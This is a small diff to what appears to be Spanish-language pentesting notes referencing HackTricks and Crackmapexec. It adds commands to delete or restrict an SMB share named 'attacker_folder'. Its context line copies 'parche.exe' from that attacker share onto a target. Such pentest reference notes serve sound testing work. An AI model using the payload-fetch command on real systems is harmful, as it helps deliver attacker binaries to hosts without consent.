@@ -1666,6 +1666,18 @@ copy \\share\attacker_folder\parche.exe parche.exe
 
 ```
 
+Para eliminar el share que cualquiera puede usar lo cual es algo peligroso...
+
+```
+net share attacker_folder /DELETE
+
+O para regresar que solo los admins puedan usarlos
+
+net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
+```
+
+
+
 > https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters
 
 ## Crackmapexec
